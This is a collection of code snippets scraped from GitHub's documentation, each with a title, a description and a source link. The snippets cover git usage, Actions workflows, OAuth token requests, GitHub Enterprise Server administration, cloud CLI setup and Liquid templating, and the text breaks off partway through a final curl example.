https://github.com/github/docs/blob/main/content/get-started/using-git/dealing-with-non-fast-forward-errors.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git pull origin YOUR_BRANCH_NAME\n# Grabs online updates and merges them with your local work\n```\n\n----------------------------------------\n\nTITLE: Requesting Access Token via API in Ruby\nDESCRIPTION: The `request_token` function sends a `POST` request to `{% data variables.product.oauth_host_code %}/login/oauth/access_token` to exchange the device code for an access token. It includes the `CLIENT_ID`, `device_code`, and `grant_type` as parameters. The `Accept` header is set to `application/json`. It depends on the `URI`, `Net::HTTP`, and `parse_response` functions.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\ndef request_token(device_code)\n  uri = URI(\"{% data variables.product.oauth_host_code %}/login/oauth/access_token\")\n  parameters = URI.encode_www_form({\n    \"client_id\" => CLIENT_ID,\n    \"device_code\" => device_code,\n    \"grant_type\" => \"urn:ietf:params:oauth:grant-type:device_code\"\n  })\n  headers = {\"Accept\" => \"application/json\"}\n  response = Net::HTTP.post(uri, parameters, headers)\n  parse_response(response)\nend\n```\n\n----------------------------------------\n\nTITLE: Linting Ruby code with Rubocop using GitHub Actions\nDESCRIPTION: This workflow installs `rubocop` and uses it to lint all files. It checks out the code, sets up Ruby version 2.6, installs dependencies using `bundle install`, and then runs `rubocop` to lint the code. The `-f github` flag formats the output for GitHub's annotation format.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nname: Linting\n\non: [push]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: '2.6'\n      - run: bundle install\n      - name: Rubocop\n        run: rubocop -f github\n```\n\n----------------------------------------\n\nTITLE: Auto-launching ssh-agent in Git for Windows\nDESCRIPTION: This script snippet configures `ssh-agent` to automatically start when opening bash or Git shell on Windows. It checks for an existing agent, starts one if necessary, and adds the SSH key to the agent. It relies on the `~/.ssh/agent.env` file to store agent details.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/working-with-ssh-key-passphrases.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nenv=~/.ssh/agent.env\n\nagent_load_env () { test -f \"$env\" && . \"$env\" >| /dev/null ; }\n\nagent_start () {\n    (umask 077; ssh-agent >| \"$env\")\n    . \"$env\" >| /dev/null ; }\n\nagent_load_env\n\n# agent_run_state: 0=agent running w/ key; 1=agent w/o key; 2=agent not running\nagent_run_state=$(ssh-add -l >| /dev/null 2>&1; echo $?)\n\nif [ ! \"$SSH_AUTH_SOCK\" ] || [ $agent_run_state = 2 ]; then\n    agent_start\n    ssh-add\nelif [ \"$SSH_AUTH_SOCK\" ] && [ $agent_run_state = 1 ]; then\n    ssh-add\nfi\n\nunset env\n```\n\n----------------------------------------\n\nTITLE: Refactored OrderService without Logging (Python)\nDESCRIPTION: This code shows the refactored `OrderService` class after the logging logic has been removed and centralized using AOP. The `place_order` method now only contains the business logic, without any logging statements.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/handling-cross-cutting-concerns.md#_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nclass OrderService:\n    def place_order(self, order):\n        # In here would be the business logic for placing an order\n        # ...\n        pass\n```\n\n----------------------------------------\n\nTITLE: Serving Jekyll site locally\nDESCRIPTION: This code snippet demonstrates how to serve a Jekyll site locally using the `bundle exec jekyll serve` command. It assumes Bundler is installed and configured for the project. The command starts a local server, allowing you to preview the site in your web browser at `http://127.0.0.1:4000/`.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/testing-your-github-pages-site-locally-with-jekyll.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ bundle exec jekyll serve\n> Configuration file: /Users/octocat/my-site/_config.yml\n>            Source: /Users/octocat/my-site\n>       Destination: /Users/octocat/my-site/_site\n> Incremental build: disabled. Enable with --incremental\n>      Generating...\n>                    done in 0.309 seconds.\n> Auto-regeneration: enabled for '/Users/octocat/my-site'\n> Configuration file: /Users/octocat/my-site/_config.yml\n>    Server address: http://127.0.0.1:4000/\n>  Server running... press ctrl-c to stop.\n```\n\n----------------------------------------\n\nTITLE: Defining Windows Runner Labels - GitHub Actions\nDESCRIPTION: These code snippets represent workflow labels used to specify the Windows runner environment in GitHub Actions. The labels allow users to select specific Windows versions for their jobs, such as 'windows-latest', 'windows-2025', 'windows-2022', and 'windows-2019'. These labels are used in the workflow configuration file to determine the virtual machine environment for running the job.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/supported-github-runners.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nwindows-latest\n```\n\nLANGUAGE: YAML\nCODE:\n```\nwindows-2025\n```\n\nLANGUAGE: YAML\nCODE:\n```\nwindows-2022\n```\n\nLANGUAGE: YAML\nCODE:\n```\nwindows-2019\n```\n\n----------------------------------------\n\nTITLE: Self-hosted Runner Log File Naming Convention\nDESCRIPTION: This snippet shows the naming convention for self-hosted runner log files. The log files are named using the format `Runner_YYYY####-xxxxxx-utc.log` and `Worker_YYYY####-xxxxxx-utc.log`. These logs are crucial for troubleshooting issues specific to self-hosted runners.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/working-with-support-for-github-actions.md#_snippet_2\n\nLANGUAGE: Text\nCODE:\n```\nRunner_YYYY####-xxxxxx-utc.log\n```\n\nLANGUAGE: Text\nCODE:\n```\nWorker_YYYY####-xxxxxx-utc.log\n```\n\n----------------------------------------\n\nTITLE: Mirroring Git Repository to GitHub\nDESCRIPTION: This command pushes the entire repository, including all branches and tags, to a remote called 'origin'. This is often used for creating a complete mirror of the repository on {% data variables.product.prodname_dotcom %}.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/migrations/push-to-github.md#_snippet_0\n\nLANGUAGE: Git\nCODE:\n```\ngit push --mirror origin\n```\n\n----------------------------------------\n\nTITLE: Registering a New Liquid Tag\nDESCRIPTION: This code snippet shows how to register a new custom Liquid tag in `src/content-render/liquid/engine.js`. It uses the `engine.registerTag` method to associate a tag name with its corresponding JavaScript class.\nSOURCE: https://github.com/github/docs/blob/main/src/content-render/README.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nengine.registerTag('my_tag', require('./liquid-tags/my-tag'))\n```\n\n----------------------------------------\n\nTITLE: Syncing GitHub Actions using actions-sync (sync)\nDESCRIPTION: This command synchronizes a specific action repository from GitHub.com to a GitHub Enterprise Server instance. It uses parameters for the cache directory, destination token, destination URL, and repository name, which includes the source and destination repository details.  Requires the `actions-sync` tool and access to both GitHub.com and the GHES instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/managing-access-to-actions-from-githubcom/manually-syncing-actions-from-githubcom.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n./actions-sync sync \\\n  --cache-dir \"cache\" \\\n  --destination-token \"aabbccddeeffgg\" \\\n  --destination-url \"https://my-ghes-instance\" \\\n  --repo-name \"actions/stale:synced-actions/actions-stale\"\n```\n\n----------------------------------------\n\nTITLE: Defining DiscussionOrderField Enum in GraphQL\nDESCRIPTION: This GraphQL enum `DiscussionOrderField` defines the properties by which discussion connections can be ordered. It includes options for ordering by creation time (`CREATED_AT`) and by the most recent modification time (`UPDATED_AT`).\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_3\n\nLANGUAGE: GraphQL\nCODE:\n```\n\"\"\"\nProperties by which discussion connections can be ordered.\n\"\"\"\nenum DiscussionOrderField {\n  \"\"\"\n  Order discussions by creation time.\n  \"\"\"\n  CREATED_AT\n\n  \"\"\"\n  Order discussions by most recent modification time.\n  \"\"\"\n  UPDATED_AT\n}\n```\n\n----------------------------------------\n\nTITLE: Creating co-authored commit - Empty Line in Shell\nDESCRIPTION: This code snippet demonstrates how to create a commit message with a blank line after the commit description when using the shell. This is crucial for Git to correctly parse the commit message and recognize the `Co-authored-by` trailers.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/committing-changes-to-your-project/creating-and-editing-commits/creating-a-commit-with-multiple-authors.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git commit -m \"Refactor usability tests.\n>\n>\n\"\n```\n\n----------------------------------------\n\nTITLE: Cloning GitHub Copilot Plugin for Vim (macOS/Linux)\nDESCRIPTION: This shell command clones the GitHub Copilot plugin repository into the appropriate directory for Vim on macOS or Linux using the built-in plugin manager. The command utilizes `git clone` to download the repository from GitHub.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/installing-the-github-copilot-extension-in-your-environment.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngit clone https://github.com/github/copilot.vim \\\n~/.vim/pack/github/start/copilot.vim\n```\n\n----------------------------------------\n\nTITLE: Markdown Tip Alert\nDESCRIPTION: This snippet shows how to create a 'Tip' alert box in Markdown. The `[!TIP]` syntax denotes a helpful suggestion or recommendation.  The alert box will render with a specific visual style indicating a tip.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/markdown/alerts.md#_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\n> [!TIP]\n> Here's a free tip\n```\n\n----------------------------------------\n\nTITLE: Modifying resolvconf service configuration\nDESCRIPTION: This command uses `sed` to add a line to the `/etc/systemd/system/resolvconf.service.d/local.conf` file, ensuring that the `/run/resolvconf` directory is created before the `resolvconf` service starts. The `-i.bak` option creates a backup of the original file. This modification persists across reboots but not upgrades.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/release-notes/2024-08-resolvconf-wont-start.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nsudo sed -i.bak \\\n'/[Service]/a ExecStartPre=\\/bin\\/mkdir \\-p \\/run\\/resolvconf' \\\n/etc/systemd/system/resolvconf.service.d/local.conf\n```\n\n----------------------------------------\n\nTITLE: Disabling Code Scanning via SSH Shell\nDESCRIPTION: This command disables Code Scanning on GitHub Enterprise Server via the administrative shell (SSH). It requires SSH access to the instance. It uses `ghe-config` to set the `app.code-scanning.enabled` configuration option to `false`. No specific output is expected, but the changes will take effect after applying the configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-code-security/managing-github-advanced-security-for-your-enterprise/enabling-github-advanced-security-for-your-enterprise.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.code-scanning.enabled false\n```\n\n----------------------------------------\n\nTITLE: Nested Conditionals with GHES Version Less Than and Greater Than\nDESCRIPTION: This example demonstrates nested conditional statements, where the first `ifversion` tag checks if the GHES version is less than 2.16, and if true, a nested `ifversion` tag checks if it's greater than 2.13. The outer `else` block renders \"Charlie\" if the GHES version is not less than 2.16.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/greater-than.md#_snippet_4\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes < 2.16 %}\n\nAlpha\n\n{% ifversion ghes > 2.13 %}\n\nBravo\n\n{% endif %}\n\n{% else %}\n\nCharlie\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Creating a Shell Script\nDESCRIPTION: Creates a shell script named `goodbye.sh` that echoes the message \"Goodbye\". The script is created by echoing the `echo Goodbye` command into a file named `goodbye.sh`. This prepares the script for execution within the composite action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-composite-action.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\necho \"echo Goodbye\" > goodbye.sh\n```\n\n----------------------------------------\n\nTITLE: YAML Frontmatter Update\nDESCRIPTION: This YAML snippet shows the frontmatter section of an article, which contains the title and redirect information. When renaming an article, the `title` and `redirect_from` fields should be updated accordingly.  The title should use sentence case and the redirect should include the old article URL.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/changing-an-articles-title.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n---\ntitle: Your article name\nintro:\nredirect_from:\n  - /articles/older-outdated-article-name/\n---\n```\n\n----------------------------------------\n\nTITLE: Import TRAP files to CodeQL dataset (Shell)\nDESCRIPTION: Imports a set of TRAP files to a raw CodeQL dataset.  It requires the dbscheme file and paths to the dataset and trap files. It allows various options for checking labels and handling errors during the import process.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/dataset-import.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql dataset import --dbscheme=<file> [--threads=<num>] <options>... -- <dataset> <trap>...\n```\n\n----------------------------------------\n\nTITLE: Checking Pages Server Status (ghe-dpages status)\nDESCRIPTION: This subcommand of `ghe-dpages` shows a summary of repository location and health for the Pages service.  It provides insights into the operational state and data distribution of GitHub Pages.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_45\n\nLANGUAGE: shell\nCODE:\n```\nghe-dpages status\n```\n\n----------------------------------------\n\nTITLE: Interactive Rebase Against Time - Git Shell\nDESCRIPTION: This command starts an interactive rebase for the last 7 commits in the current branch. The `HEAD~7` specifies the point in time to rebase against. Similar to the previous command, this opens an editor where you can modify commit actions for the rebase process.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git-rebase.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit rebase --interactive HEAD~7\n```\n\n----------------------------------------\n\nTITLE: Pushing Git LFS Objects to Mirror\nDESCRIPTION: Pushes the Git Large File Storage (LFS) objects to the mirrored repository. This ensures that the LFS objects are also mirrored along with the regular Git data.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/duplicating-a-repository.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit lfs push --all https://github.com/EXAMPLE-USER/NEW-REPOSITORY.git\n```\n\n----------------------------------------\n\nTITLE: Disabling Let's Encrypt - Shell\nDESCRIPTION: This command disables the automated TLS certificate management using Let's Encrypt on GitHub Enterprise Server. It's a prerequisite for reissuing the certificate to update Subject Alternative Names (SANs).\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/configuring-tls.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-ssl-acme -d\n```\n\n----------------------------------------\n\nTITLE: Creating Ordered Lists in Markdown\nDESCRIPTION: Demonstrates how to create ordered lists using numbers followed by a period. The snippet shows a basic ordered list with three items.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_10\n\nLANGUAGE: markdown\nCODE:\n```\n1. James Madison\n2. James Monroe\n3. John Quincy Adams\n```\n\n----------------------------------------\n\nTITLE: Creating Symbolic Links in postCreate.sh\nDESCRIPTION: This script demonstrates how to create a symbolic link from a directory within the `.devcontainer` directory to the home directory. This ensures that the contents of the `config` directory are persisted across container rebuilds.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/rebuilding-the-container-in-a-codespace.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n#!/bin/bash\nln -sf $PWD/.devcontainer/config $HOME/config && set +x\n```\n\n----------------------------------------\n\nTITLE: Updating Deployment Status (Ruby)\nDESCRIPTION: This snippet defines the `update_deployment_status` method, which simply prints the deployment status to the console. It extracts the deployment ID and state from the payload and outputs a message indicating the current status.  This simulates monitoring the deployment status.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/delivering-deployments.md#_snippet_5\n\nLANGUAGE: Ruby\nCODE:\n```\ndef update_deployment_status\n  puts \"Deployment status for #{@payload['id']} is #{@payload['state']}\"\nend\n```\n\n----------------------------------------\n\nTITLE: Enabling Kubernetes Engine and Container Registry APIs\nDESCRIPTION: This command enables the Kubernetes Engine and Container Registry APIs using the `gcloud` CLI. It's a prerequisite for interacting with GKE and GCR.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ gcloud services enable \\\n\tcontainerregistry.googleapis.com \\\n\tcontainer.googleapis.com\n```\n\n----------------------------------------\n\nTITLE: Using Liquid Conditionals for Versioning\nDESCRIPTION: This snippet illustrates how to use Liquid conditionals to display different content based on the feature version. The `ifversion` tag checks if a specific feature is enabled and renders the corresponding content.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_12\n\nLANGUAGE: liquid\nCODE:\n```\n{% raw %}{% ifversion meow %} ... {% endif %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Listing GitHub Enterprise Server Appliance Images on Azure - Shell\nDESCRIPTION: This command retrieves a list of available GitHub Enterprise Server appliance images from Azure. It uses the `az vm image list` command with filtering and sorting to find the appropriate image based on the 'GitHub-Enterprise' keyword within the image URN.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-azure.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\naz vm image list --all -f GitHub-Enterprise | grep '\"urn\": \"GitHub:' | sort -V\n```\n\n----------------------------------------\n\nTITLE: Conditional Note Display using Liquid Templating\nDESCRIPTION: This snippet uses Liquid's `ifversion` tag to conditionally display a note. The note informs users about potential billing implications when using security configurations in {% data variables.product.prodname_security_configurations %}. It's displayed only if the product version is either `fpt` or `ghec`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/security-configurations/security-features-use-actions.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghec %}\n>[!NOTE] Some features enabled in {% data variables.product.prodname_security_configurations %} may require Actions minutes to work. {% data variables.product.prodname_dotcom %} will let you know if that's the case when you apply the configuration to a repository. For more information about billing for {% data variables.product.prodname_actions %}, see [AUTOTITLE](/billing/managing-billing-for-github-actions/about-billing-for-github-actions).\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Opening Codespace in Browser via GitHub CLI\nDESCRIPTION: This command opens a GitHub Codespace in the default web browser. It uses the GitHub CLI to specify that the codespace should be opened in a browser window.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/opening-an-existing-codespace.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace code --web\n```\n\n----------------------------------------\n\nTITLE: Checkout Empty Subversion Trunk\nDESCRIPTION: This snippet performs an empty checkout of the trunk branch. This is often used as a starting point when switching between different branches. Requires the svn client to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/working-with-subversion-on-github/support-for-subversion-clients.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nsvn co --depth empty https://github.com/USER/REPO/trunk\n```\n\n----------------------------------------\n\nTITLE: Querying the Search Endpoint\nDESCRIPTION: This snippet shows how to directly query the GitHub Docs search endpoint. It requires specifying the version, language code, and query as parameters. The version should be a supported GitHub Enterprise Server version, Enterprise Cloud (`ghec`), or the Free pro team plan (`dotcom`).  The language code should be one of the supported languages (`es`, `ja`, `pt`, `zh`, `ru`, `fr`, `ko`, `de`). The query parameter is any alphanumeric string value.\nSOURCE: https://github.com/github/docs/blob/main/src/search/README.md#_snippet_0\n\nLANGUAGE: HTTP\nCODE:\n```\nhttps://docs.github.com/search?version=<VERSION>&language=<LANGUAGE CODE>&query=<QUERY>\n```\n\n----------------------------------------\n\nTITLE: Running GitHub Docs Locally\nDESCRIPTION: This snippet provides the commands necessary to clone the GitHub Docs repository, install dependencies, build the site, and start the local development server.\n\nDependencies: git, Node.js (with npm)\n\nCommands:\n- `git clone`: Clones the GitHub Docs repository.\n- `cd`: Navigates to the cloned directory.\n- `npm ci`: Installs dependencies from package-lock.json.\n- `npm run build`: Builds the static assets.\n- `npm start`: Starts the local development server.\nSOURCE: https://github.com/github/docs/blob/main/contributing/development.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit clone https://github.com/github/docs\ncd docs\nnpm ci\nnpm run build\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Getting and Parsing Webhook Payload (Ruby)\nDESCRIPTION: This helper method `get_payload_request` extracts the raw payload from the incoming request, rewinds the request body, reads the raw data, and then parses it as JSON. It handles potential JSON parsing errors and raises an exception if the payload is invalid. The parsed payload is stored in the `@payload` instance variable.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\n    # Saves the raw payload and converts the payload to JSON format\n    def get_payload_request(request)\n      # request.body is an IO or StringIO object\n      # Rewind in case someone already read it\n      request.body.rewind\n      # The raw text of the body is required for webhook signature verification\n      @payload_raw = request.body.read\n      begin\n        @payload = JSON.parse @payload_raw\n      rescue => e\n        fail 'Invalid JSON (#{e}): #{@payload_raw}'\n      end\n    end\n```\n\n----------------------------------------\n\nTITLE: Creating firewall rules on GCP using gcloud\nDESCRIPTION: This command creates firewall rules on Google Cloud Platform using the gcloud compute command-line tool. It allows TCP traffic on ports 22, 25, 80, 122, 443, 8080, 8443, and 9418, UDP traffic on ports 161 and 1194, and ICMP traffic.  Replace `RULE-NAME` and `NETWORK-NAME` with appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-google-cloud-platform.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ gcloud compute firewall-rules create RULE-NAME \\\n--network NETWORK-NAME \\\n--allow tcp:22,tcp:25,tcp:80,tcp:122,udp:161,tcp:443,udp:1194,tcp:8080,tcp:8443,tcp:9418,icmp\n```\n\n----------------------------------------\n\nTITLE: Setting registry credentials for Azure Web App using Azure CLI\nDESCRIPTION: This snippet demonstrates how to set registry credentials for the Azure Web App using the Azure CLI.  It requires the Azure CLI to be installed and configured, along with a personal access token (PAT) having `repo` and `read:packages` scopes. Replace the placeholder variables (MY_WEBAPP_NAME, MY_RESOURCE_GROUP, MY_REPOSITORY_OWNER, MY_PERSONAL_ACCESS_TOKEN) with your actual values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-docker-to-azure-app-service.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\naz webapp config appsettings set \\\n    --name MY_WEBAPP_NAME \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --settings DOCKER_REGISTRY_SERVER_URL=https://ghcr.io DOCKER_REGISTRY_SERVER_USERNAME=MY_REPOSITORY_OWNER DOCKER_REGISTRY_SERVER_PASSWORD=MY_PERSONAL_ACCESS_TOKEN\n```\n\n----------------------------------------\n\nTITLE: Download Migration Archive - REST API\nDESCRIPTION: This snippet demonstrates how to download a migration archive using the GitHub REST API. A GET request is made to the `/orgs/ORGANIZATION/migrations/MIGRATION_ID/archive` endpoint. The response is a `302 Found` redirect to the archive URL, which must be downloaded separately. The request requires authentication via a Bearer token.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_6\n\nLANGUAGE: HTTP\nCODE:\n```\nGET /api/v3/orgs/acme-corp/migrations/123/archive HTTP/1.1\nAccept: application/vnd.github+json\nAuthorization: Bearer <TOKEN>\nHost: github.acmecorp.net\n\nHTTP/1.1 302 Found\nLocation: https://media.github.acmecorp.net/migrations/123/archive/cca2ebe9-7403-4ffa-9b6a-4c9e16c94410?token=AAAAABEWE7JP4H2HACKEGMTDOYRC6\n```\n\n----------------------------------------\n\nTITLE: Projects Feature Planning Video Metadata\nDESCRIPTION: This metadata entry describes a video about using Projects for feature planning within GitHub Issues. It specifies the video's title, a non-cookie YouTube URL, a brief description highlighting new features, associated products (Issues, Projects), version compatibility (projects-v2), date added, location in the documentation, and the path to the video transcript.\nSOURCE: https://github.com/github/docs/blob/main/contributing/videos-in-docs.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nTitle: Using Projects for feature planning\nURL: https://www.youtube-nocookie.com/embed/yFQ-p6wMS_Y\nDescription: Check out all the cool new things you can do with your GitHub Projects powered by GitHub Issues\nProduct: Issues, Projects\nVersions: projects-v2\nDate added: 2023-05-09\nLocation: /content/issues/index.md\nTranscript: /video-transcripts/transcript-using-projects-for-feature-planning\n```\n\n----------------------------------------\n\nTITLE: Creating a release with cross-compiled GitHub CLI extension binaries\nDESCRIPTION: These shell commands create a release and build binaries for different operating systems. It tags a release version, pushes the tag to the remote repository, compiles the Go source code for Windows, Linux, and Darwin (macOS) architectures using `GOOS` and `GOARCH`, and attaches the binaries to the new release using `gh release create`.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_18\n\nLANGUAGE: Shell\nCODE:\n```\ngit tag v1.0.0\ngit push origin v1.0.0\nGOOS=windows GOARCH=amd64 go build -o gh-EXTENSION-NAME-windows-amd64.exe\nGOOS=linux GOARCH=amd64 go build -o gh-EXTENSION-NAME-linux-amd64\nGOOS=darwin GOARCH=amd64 go build -o gh-EXTENSION-NAME-darwin-amd64\ngh release create v1.0.0 ./*amd64*\n```\n\n----------------------------------------\n\nTITLE: Git Push with Pre-Receive Hook Failure (Shell)\nDESCRIPTION: This code snippet demonstrates a typical error message received when a `git push` command is rejected due to a failed pre-receive hook. It includes the details of the remote rejection, the specific hook that failed (`always_reject.sh`), and the resulting error message.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/collaborating-on-repositories-with-code-quality-features/working-with-pre-receive-hooks.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ git push\nCounting objects: 3, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (2/2), done.\nWriting objects: 100% (3/3), 916 bytes | 0 bytes/s, done.\nTotal 3 (delta 0), reused 0 (delta 0)\nremote: always_reject.sh: failed with exit status 1\nremote: error: rejecting all pushes\nTo https://54.204.174.51/hodor/nope.git\n ! [remote rejected] main -> main (pre-receive hook declined)\nerror: failed to push some refs to 'https://54.204.174.51/hodor/nope.git'\n```\n\n----------------------------------------\n\nTITLE: Defining Check Run Actions with JSON\nDESCRIPTION: This JSON snippet demonstrates how to define actions for a check run.  When a check run is created with this `actions` object, a button will appear in the Checks tab of a pull request, allowing users to trigger additional tasks. The `label` defines the button text, `description` provides a tooltip, and `identifier` is used to identify the action in the `check_run.requested_action` webhook payload.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/using-the-rest-api-to-interact-with-checks.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n\"actions\": [{\n  \"label\": \"Fix this\",\n  \"description\": \"Let us fix that for you\",\n  \"identifier\": \"fix_errors\"\n}]\n```\n\n----------------------------------------\n\nTITLE: Conditional Logic for Compliance Listings - YAML\nDESCRIPTION: This snippet uses conditional logic based on the GitHub product version (GHEC or FPT) to display the relevant compliance certifications and reports. It dynamically includes different items in the list depending on whether the version is GHEC or FPT. The `ifversion` tag controls which content is rendered.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/security/compliance-report-list.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n{%- ifversion ghec %}\n* SOC 1, Type 2\n* SOC 2, Type 1 ({% data variables.product.prodname_copilot_for_business %} only)\n* SOC 2, Type 2\n{%- elsif fpt %}\n* SOC 3\n{%- endif %}\n* Cloud Security Alliance CAIQ self-assessment (CSA CAIQ - Level 1)\n* ISO/IEC 27001:2013 certification\n{%- ifversion ghec %}\n* Cloud Security Alliance STAR certification (CSA STAR - Level 2)\n* {% data variables.product.prodname_dotcom_the_website %} Services Continuity and Incident Management Plan\n{%- endif %}\n```\n\n----------------------------------------\n\nTITLE: Liquid Conditional with Capitalization Filter\nDESCRIPTION: This Liquid snippet demonstrates a conditional statement that checks the value of `product.title`. If it equals \"Awesome Shoes\", the `name` variable is capitalized using the `capitalize` filter. The result is then rendered within the template. This requires the Liquid templating engine to parse and execute the code.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/liquid-tags/minimal-conditional.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% if product.title == \"Awesome Shoes\" %} {{name | capitalize}} {% endif %}\n```\n\n----------------------------------------\n\nTITLE: CodeQL CLI Version Command\nDESCRIPTION: Displays the version of the CodeQL toolchain. This command provides options for formatting the output, controlling verbosity, and managing the location of cached data.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/version.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql version <options>...\n```\n\n----------------------------------------\n\nTITLE: Requesting Image Headers with Curl\nDESCRIPTION: This code snippet demonstrates how to use `curl` to request the headers of an image when checking for cache issues.  The `-I` flag tells `curl` to only retrieve the headers. The example shows a scenario where `Cache-Control` might be missing.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/about-anonymized-urls.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ curl -I https://www.my-server.com/images/some-image.png\n> HTTP/2 200\n> Expires: 